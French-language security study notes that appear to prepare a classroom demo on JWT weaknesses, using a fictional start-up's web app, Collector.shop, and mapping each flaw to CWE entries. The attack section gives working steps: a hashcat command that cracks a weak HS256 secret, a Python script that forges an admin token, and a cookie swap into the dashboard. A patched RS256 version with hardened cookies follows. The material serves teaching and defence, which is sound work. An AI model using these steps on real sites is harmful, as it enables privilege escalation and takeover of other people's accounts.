# Notes de Recherche - Sécurité

## Menaces Émergentes

### AI-Driven Attacks
Utilisation de LLM pour générer des payloads et scanner des failles

### Supply Chain
Compromission de dépendances (XZ Utils, Log4Shell)

### API Attacks
Explosion des attaques sur les interfaces programmatiques

### Cloud Misconfigurations
Erreurs de configuration des services cloud

---

## Réglementations Sécurité Europe

- **RGPD** : Protection des données personnelles
- **NIS2** : Sécurité des infrastructures critiques
- **DORA** : Résilience opérationnelle (Finance)
- **Cyber Resilience Act** : Sécurité produits IoT

## Réglementations Sécurité International

- **PCI-DSS 4.0** : Industrie des paiements
- **SOC 2** : Contrôles de sécurité cloud
- **ISO 27001:2022** : Management sécurité
- **NIST SSDF** : Développement sécurisé

---

## Vulnérabilités

### Cookie
**Référence CWE** : https://cwe.mitre.org/data/definitions/863.html

---

## JWT - Analyse de Vulnérabilités

### 2. Secrets faibles ou par défaut (Brute-force)

Pour les signatures symétriques (HS256), le serveur utilise une clé secrète pour signer et vérifier le jeton.

**La faille** : Utiliser un secret simple comme "123456", "secret" ou la valeur par défaut du framework.

**L'impact** : Un attaquant peut récupérer un jeton valide et tester des millions de secrets par seconde hors-ligne (via des outils comme hashcat). Une fois le secret trouvé, il peut forger n'importe quel jeton.

#### Scénario d'attaque
1. Un JWT est présent dans les cookies
2. L'attaquant récupère ce cookie
3. Il brute-force le secret
4. Il peut ensuite créer ses propres JWT avec un payload custom qui lui donnerait des droits admins

---

## Analyse CWE - JWT Vulnerability Chain

### 1. La racine du problème : Utilisation d'un secret faible

#### CWE-321 : Use of Hard-coded Cryptographic Key
**Pourquoi** : Si le secret est écrit en clair dans le code ou un fichier de config simple, il est souvent générique.

#### CWE-521 : Weak Password Requirements
**Pourquoi** : S'applique ici car le "secret" utilisé pour signer le HS256 agit comme un mot de passe. S'il est court ou présent dans un dictionnaire (comme "123456"), il est considéré comme faible.

### 2. L'accès au cookie (Interception)

Si l'attaquant a pu récupérer le cookie, c'est qu'il manquait des protections sur le transport ou le stockage.

#### CWE-614 : Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
**Pourquoi** : Si le flag Secure est absent, le cookie a pu être intercepté en clair sur le réseau (Man-in-the-Middle).

#### CWE-1004 : Sensitive Cookie Without 'HttpOnly' Flag
**Pourquoi** : Si l'attaquant a récupéré le cookie via une faille XSS, c'est que l'attribut HttpOnly n'était pas présent pour empêcher JavaScript de le lire.

### 3. La modification du Payload (Manipulation)

Une fois le secret trouvé, l'attaquant modifie les données pour devenir admin.

#### CWE-290 : Authentication Bypass by Spoofing
**Pourquoi** : L'attaquant se fait passer pour un administrateur en forgeant un jeton que le serveur accepte comme légitime.

#### CWE-502 : Deserialization of Untrusted Data
**Pourquoi** : Le serveur fait confiance au contenu du JWT (le JSON désérialisé) pour définir les permissions de l'utilisateur sans vérification externe supplémentaire.

### 4. L'impact final : Élévation de privilèges

#### CWE-285 : Improper Authorization
**Pourquoi** : Le système de contrôle d'accès échoue à vérifier si l'utilisateur possède réellement les droits qu'il prétend avoir dans son jeton.

#### CWE-269 : Improper Privilege Management
**Pourquoi** : L'application permet à un utilisateur de s'octroyer des privilèges supérieurs à ceux qui lui ont été initialement attribués.

---

## Scénario d'Attaque Complet

Un JWT utilisant HS256 est présent dans les cookies. L'attaquant récupère ce cookie via HTTP.
Ensuite il cherche le secret via du brute force.
Il peut ensuite créer ses propres JWT avec un payload custom qui lui donnerait des droits admins.

### Failles identifiées
- CWE-321 : Use of Hard-coded Cryptographic Key
- CWE-521 : Weak Password Requirements
- CWE-614 : Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
- CWE-290 : Authentication Bypass by Spoofing
- CWE-502 : Deserialization of Untrusted Data

### Impacts
- CWE-285 : Improper Authorization
- CWE-269 : Improper Privilege Management

---

## Scénario Détaillé

Un attaquant intercepte un jeton JWT (signé en HS256) stocké dans un cookie non sécurisé. 
Grâce à la faiblesse du secret utilisé pour la signature, il parvient à casser le chiffrement, 
modifier ses propres droits et usurper l'identité d'un administrateur pour accéder à une interface 
de gestion critique.

---

## Cas d'Étude : Collector

### Contexte de l'entreprise

**Collector** est une start-up française qui a levé des fonds par crowdfunding pour lancer son nouveau projet d'application web de vente d'objets de collection entre particuliers.

L'entreprise, qui a 5 ans d'existence, était orientée événementiel, jusqu'à cette levée de fond. Elle organisait dans plusieurs villes de France des salons autour des objets de collections du « quotidien » tels que :
- Baskets en édition limitée
- Posters dédicacés
- Figurines Hasbro Star Wars originales
- Cassettes V2000 de films, etc.

Pour cela, elle crée des partenariats institutionnels (mairie), les acteurs locaux (magasin spécialisé, friperie, etc.) et les particuliers collectionneurs qui voulaient revendre ou échanger leurs objets.

#### Direction
Ses 2 dirigeant.e.s sont des spécialistes de l'événementiel et passionnées d'objets « vintage » rares ou uniques (ceux qui ravivent les souvenirs et émotions). Leur segment de marché n'inclut pas les objets de luxe et de la brocante classique. Dans une autre vie, ils/elles ont été chef de projet IT en ESN.

#### Équipe
- Responsable administratif et RH
- Responsable de communication et marketing (spécialité marketing digital)
- Lead developer (nouveau depuis levée de fonds)
- 2 développeur.euse.s confirmé.e.s avec 5 ans d'expérience

De nouvelles embauches sont envisagées pour garantir la réussite du projet.

#### Infrastructure actuelle
La start-up occupe des locaux dans un incubateur d'entreprise. Son système informatique est pour l'instant limité :
- Outils bureautiques : Office 365 Business Standard, Power BI
- Service de messagerie : Exchange
- Adobe Creative Cloud
- Ordinateurs portables sous Windows 11
- 1 Mac pour la conception graphique
- Accès Internet via le WiFi de l'incubateur
- Site vitrine WordPress hébergé chez un fournisseur français

---

## Contexte de la WebApp : Collector.shop

### Design
Aspect "amateur" / débutant (UI rudimentaire style année 2000)

### Pages disponibles
- Connexion
- Catalogue des produits
- Dashboard Admin (restreint)

### Mécanisme
Authentification par cookie contenant un JWT

### Structure du JWT

**Header :**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload :**
```json
{
  "sub": "...",
  "name": "<user>",
  "admin": false,
  "iat": "...",
  "exp": "..."
}
```

Le JWT est mis en cookie lors de la connexion.

### Vulnérabilités présentes
- CWE-321 : Use of Hard-coded Cryptographic Key
- CWE-521 : Weak Password Requirements
- CWE-614 : Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
- CWE-290 : Authentication Bypass by Spoofing
- CWE-502 : Deserialization of Untrusted Data

---

## Déroulement de l'Attaque

### Étapes pour réaliser l'attaque

1. **Connexion** : L'attaquant se connecte en tant qu'utilisateur
2. **Extraction** : Inspecter l'élément → Onglet Application → Cookies (pour récupérer le cookie)
3. **Brute-force** : `hashcat -m 16500 jwt_token.txt dictionnaire.txt` (pour trouver le secret)
4. **Validation** : Aller sur https://www.jwt.io/
5. **Forge** : Réalisation d'un script pour build le JWT (cf Script)
6. **Injection** : L'attaquant modifie le cookie
7. **Accès** : L'attaquant peut maintenant accéder au dashboard admin

### Script d'exploitation

```python
import jwt
import datetime

# Configuration
secret = "123456"  # Le secret craqué avec Hashcat
algo = "HS256"

# Le payload que l'on veut forger
payload = {
    "sub": "1234567890",
    "name": "Attaquant",
    "admin": True,  # Élévation de privilège
    "iat": datetime.datetime.utcnow(),
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=2)
}

# Génération du token
token = jwt.encode(payload, secret, algorithm=algo)

print(f"Voici ton JWT forgé :\n{token}")
```

---

## Version Sécurisée : Collector.shop (Version Patchée)

Pour corriger ces failles et répondre aux exigences de NIS2 et du RGPD, l'équipe IT de Collector doit implémenter les correctifs suivants.

### Améliorations de l'Infrastructure & Design

#### UI/UX
Passage à un design moderne (Tailwind CSS/Bootstrap), propre et professionnel, renforçant la confiance des utilisateurs.

#### HTTPS Obligatoire
Installation d'un certificat TLS (Let's Encrypt) avec redirection HSTS.

### Sécurisation du JWT (Correctifs techniques)

#### Passage à l'Asymétrique (RS256)
Au lieu d'un secret partagé "123456" (HS256), on utilise un couple clé publique/clé privée.

- **Clé Privée** : Reste sur le serveur (pour signer)
- **Clé Publique** : Utilisée uniquement pour vérifier. Même si l'attaquant la trouve, il ne peut pas signer de jeton

**Impact** : Élimine CWE-321 et CWE-521

#### Durcissement des Cookies
Le cookie de session est maintenant configuré avec des attributs de sécurité stricts :
- `Secure` : Transmission uniquement via HTTPS
- `HttpOnly` : Non accessible par JavaScript
- `SameSite=Strict` : Protection contre CSRF

---

## Déroulé de la Démo

### 1. Screen des Vulnérabilités (Version Vulnerable)

#### 1.1 Affichage de l'Application Collector.shop

- **Présentation UI** : Montrer le design amateur/débutant (style année 2000)
  - Interface rudimentaire
  - Pages de connexion, catalogue, dashboard admin
  - Absence de certificat HTTPS (affichage de l'avertissement du navigateur)

#### 1.2 Inspection du Code Source

**Démonstration dans les DevTools (F12) :**

1. Onglet **Network** (État du HTTPS)
   - Afficher les requêtes en HTTP (non chiffrées)
   - Cliquer sur une requête pour montrer les headers
   - Révéler l'absence de headers de sécurité (HSTS, CSP, etc.)

2. Onglet **Application → Cookies**
   - Montrer le cookie `auth_token` contenant le JWT
   - Afficher les attributs du cookie :
     - ❌ `Secure` : absent (transmission en clair possible)
     - ❌ `HttpOnly` : absent (accessible par JavaScript)
     - ❌ `SameSite` : absent (vulnérable aux attaques CSRF)

3. Copier le JWT complet pour l'étape suivante

#### 1.3 Décryptage du JWT sur jwt.io

- Ouvrir https://www.jwt.io/
- Coller le JWT dans le champ "Encoded"
- Afficher le **Header** :
  ```json
  {
    "alg": "HS256",
    "typ": "JWT"
  }
  ```
- Afficher le **Payload** :
  ```json
  {
    "sub": "user123",
    "name": "utilisateur_normal",
    "admin": false,
    "iat": 1705761600,
    "exp": 1705848000
  }
  ```
- Montrer le **Signature** avec un secret faible (ex: "123456")

#### 1.4 Vérification de la Vulnérabilité du Secret

- Dans jwt.io, modifier le secret en bas
- Essayer plusieurs secrets simples : "123456", "secret", "password", "admin"
- Afficher le message "Signature Verified" ou "Invalid Signature"
- Montrer que le secret "123456" est valide

### 2. Réalisation de l'Attaque

#### 2.1 Extraction du JWT

```bash
# Copier depuis les DevTools du navigateur
# Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

#### 2.2 Brute-force du Secret avec Hashcat

```bash
# Créer un fichier jwt_token.txt contenant le JWT
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." > jwt_token.txt

# Utiliser un dictionnaire simple pour le brute-force
hashcat -m 16500 jwt_token.txt dictionnaire.txt

# Résultat attendu :
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...:123456
```

**Durée** : Quelques secondes à minutes selon la taille du dictionnaire

#### 2.3 Forge du JWT avec le Secret Trouvé

**Script Python d'exploitation :**

```bash
python3 forge_jwt.py
```

**Exécution du script :**

```
Voici ton JWT forgé :
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkF0dGFxdWFudCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDU3NjE2MDAsImV4cCI6MTcwNTc2ODgwMH0.abc123...
```

#### 2.4 Injection du JWT dans le Navigateur

1. Ouvrir les **DevTools** (F12)
2. Onglet **Application → Cookies**
3. Chercher le cookie `auth_token`
4. Cliquer dessus et éditer la valeur
5. Remplacer par le JWT forgé contenant `"admin": true`
6. Valider

#### 2.5 Accès au Dashboard Admin

1. Rafraîchir la page (F5)
2. Le navigateur envoie le nouveau JWT dans la requête
3. Le serveur accepte le jeton sans vérification externe
4. **Accès accordé** au Dashboard Admin avec les privilèges d'administrateur

**Pages maintenant accessibles :**
- Gestion des utilisateurs
- Modification des produits
- Suppression de contenu
- Accès aux données sensibles

### 3. Screens des Vulnérabilités Corrigées (Version Patchée)

#### 3.1 Affichage de la Version Sécurisée

#### 3.1.1 Infrastructure & Design Amélioré

- **Certificat HTTPS**
  - Navigateur affiche le cadenas ✅
  - URL en `https://collector.shop` (pas `http://`)
  - Pas d'avertissement de sécurité

- **Design Moderne**
  - Interface utilisant Tailwind CSS/Bootstrap
  - Design professionnel et moderne
  - Confiance utilisateur accrue
  - Responsive design

#### 3.1.2 Inspection des Cookies Sécurisés

**DevTools → Application → Cookies :**

Afficher les attributs du nouveau cookie :
```
Name:     auth_token
Value:    eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
Domain:   collector.shop
Path:     /
Expires:  [Date]
Size:     [Bytes]

Flags:
✅ Secure        → Transmission uniquement en HTTPS
✅ HttpOnly      → Non accessible par JavaScript
✅ SameSite      → Strict (protection CSRF)
```

#### 3.1.3 Décryptage du Nouveau JWT

- Ouvrir https://www.jwt.io/
- Coller le nouveau JWT (RS256)
- Afficher le **Header** :
  ```json
  {
    "alg": "RS256",
    "typ": "JWT"
  }
  ```
- Afficher le **Payload** :
  ```json
  {
    "sub": "user123",
    "name": "utilisateur_normal",
    "admin": false,
    "iat": 1705761600,
    "exp": 1705848000
  }
  ```
- **Montrer que la signature est RSA (asymétrique)**
- Essayer de changer le secret : Message "Invalid Signature" persistent
  - La clé publique ne peut pas modifier le contenu
  - Seule la clé privée du serveur peut signer les jetons

#### 3.2 Tentative d'Attaque sur la Version Sécurisée

#### 3.2.1 Récupération du JWT (Succès)

- Toujours possible via les DevTools (étape identique)
- ✅ Cookie extraction possible

#### 3.2.2 Brute-force du Secret (Échec)

```bash
hashcat -m 16500 jwt_token.txt dictionnaire.txt

# Résultat :
# STATUS: No hashes cracked.
```

**Pourquoi ça ne marche pas :**
- Algorithme RS256 (asymétrique) vs HS256 (symétrique)
- Pas de clé secrète partagée à casser
- Seule la clé publique est connue (c'est normal)
- L'attaquant ne peut pas signer sans la clé privée

#### 3.2.3 Tentative de Forge du JWT (Échec)

- Éditer le payload pour changer `"admin": false` → `"admin": true`
- Recalculer la signature avec le script Python
- Le serveur reçoit le JWT modifié
- Le serveur refuse le jeton : **Signature Invalid**
  - La vérification avec la clé publique échoue
  - Le contenu modifié ne correspond plus à la signature

#### 3.2.4 Accès au Dashboard Admin (Refusé)

- Injecter le JWT forgé dans le cookie
- Rafraîchir la page
- **Erreur 401 Unauthorized** ou redirection vers la connexion
- Le serveur a détecté la tentative d'usurpation

### 3.3 Synthèse des Correctifs

#### Tableau Comparatif

| Aspect | Avant (Vulnerable) | Après (Sécurisé) |
|--------|------------------|-----------------|
| **Protocole** | HTTP (non chiffré) | HTTPS (chiffré) |
| **Algorithme JWT** | HS256 (symétrique) | RS256 (asymétrique) |
| **Secret** | "123456" (faible) | Clé privée (forte) |
| **Cookie Secure** | ❌ Non | ✅ Oui |
| **Cookie HttpOnly** | ❌ Non | ✅ Oui |
| **Cookie SameSite** | ❌ Absent | ✅ Strict |
| **Vérification** | Aucune après auth | Signature RSA validée |
| **CWE-321** | ❌ Vulnérable | ✅ Corrigé |
| **CWE-521** | ❌ Vulnérable | ✅ Corrigé |
| **CWE-614** | ❌ Vulnérable | ✅ Corrigé |
| **CWE-290** | ❌ Vulnérable | ✅ Corrigé |

#### Conformité Réglementaire

- ✅ **NIS2** : Sécurité des infrastructures critiques (chiffrement, authentification forte)
- ✅ **RGPD** : Protection des données sensibles (confidentialité, intégrité)
- ✅ **PCI-DSS 4.0** : Transmission sécurisée des données (HTTPS obligatoire)
- ✅ **ISO 27001:2022** : Gestion de la sécurité de l'information
